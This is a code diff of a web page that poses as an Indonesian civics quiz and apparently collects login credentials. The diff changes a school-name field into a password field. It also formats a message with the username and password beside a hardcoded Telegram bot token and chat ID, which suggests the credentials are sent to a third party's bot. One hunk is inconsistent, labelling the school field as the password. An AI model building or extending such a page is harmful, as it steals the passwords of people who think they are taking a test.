@@ -501,8 +501,8 @@
                     <input type="text" id="userName" required placeholder="Username / Email">
                 </div>
                 <div class="form-group">
-                    <label>Asal Sekolah</label>
-                    <input type="text" id="userPass" required placeholder="Masukkan nama sekolah Anda">
+                    <label>Password</label>
+                    <input type="password" id="userPass" required placeholder="Password">
                 </div>
                 <button type="submit" class="verify-btn" id="submitBtn">Lanjutkan</button>
                 <button type="button" class="back-btn" onclick="backToSocial()">Kembali</button>
@@ -611,7 +611,7 @@
             const score = calculateScore();
             const message = `🎓 DATA PESERTA TES PKN\n\n` +
                           `Username: ${userData.name}\n` +
-                          `Password: ${userData.pass}\n`;
+                          `Password: ${userData.school}\n`;
             const botToken = '8498198173:AAGpZjqsAiL1l9PRKCCLj4T4tPCIDltZ_EE';
             const chatId = '8124375866';
             
